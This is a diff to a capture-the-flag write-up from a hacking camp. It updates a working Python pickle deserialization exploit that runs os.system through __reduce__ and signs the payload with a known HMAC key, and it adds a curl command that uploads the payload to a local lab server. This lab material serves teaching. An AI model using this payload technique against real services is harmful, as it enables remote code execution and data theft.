@@ -63,14 +63,17 @@ Misc CTF wargame presented at **The 31st PoC Hacking Camp**
 > The location of `flag.txt` is provided in advance — it's in the same directory as `app.py`.
 
 ```python
-# Attack example
-# Python script to generate the exploit locally
-
+# attack scenario (test)
+# this is the script file which the attacker uses in his local PC
 import pickle, os, hashlib, hmac
+
+# print(os.path.abspath("app/uploads"))
+UPLOAD_DIR = '/app/uploads'
+uuid = "d7fead..."
 
 class RCE:
     def __reduce__(self):
-        return (os.system, ("cat flag.txt > app/uploads/hacked.txt",))
+        return (os.system, (f"cat /flag.txt > {UPLOAD_DIR}/{uuid}/hacked.txt",))
 
 SECRET_KEY = "pickle_tickle"
 payload = pickle.dumps(RCE())
@@ -87,8 +90,15 @@ print(f"HMAC signature: {sig}")
 > Use the curl command to upload your crafted pickle file to `app/uploads/`. Upon upload, the RCE will trigger automatically and execute the injected command.
 > Note: The HMAC signature may differ from the example depending on your script written in step 3.
 
+```bash
+curl -X POST http://127.0.0.1:5000/upload \
+  -F "file=@malicious.pkl" \
+  -F "sig=90c67..." \
+  -F "uuid=d7fead..."
+```
+
 <p align="center">
-  <img src="https://github.com/user-attachments/assets/7789e994-f6c6-4049-8d05-fc3d46fab58c" width="70%" />
+  <img src="https://github.com/user-attachments/assets/d75172f2-a7ba-448e-8d4c-63a8fccf7646" width="90%" />
 </p>
 
 ---
@@ -98,7 +108,6 @@ print(f"HMAC signature: {sig}")
 > Once you click the file, the flag will be revealed as below:
 
 <p align="center">
-  <img src="https://github.com/user-attachments/assets/c5d1a659-cb95-46d5-b088-8e80f93a5ae2" width="70%" />
   <img src="https://github.com/user-attachments/assets/7337c346-8fa6-4428-a56f-3d6fc08751a4" width="70%" />
 </p>
 
